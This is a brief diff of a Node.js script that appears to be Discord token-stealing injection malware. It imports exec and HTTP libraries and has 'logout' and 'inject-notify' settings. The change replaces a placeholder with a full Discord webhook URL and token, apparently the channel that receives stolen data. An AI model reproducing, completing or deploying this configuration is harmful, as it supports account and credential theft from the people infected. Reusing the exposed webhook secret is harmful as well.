@@ -13,7 +13,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "da_webhook"
+const webhook = "https://canary.discord.com/api/webhooks/984125726808768562/vcdyF-bGlyFZdHljJenfRuG6BLSjZEsPGrkNmlOf5ZRpMBJ4kQM2IqBwhn68dHL6WONw"
 const config = {
     "logout": "%LOGOUT%1",
     "inject-notify": "%INJECTNOTI%1",
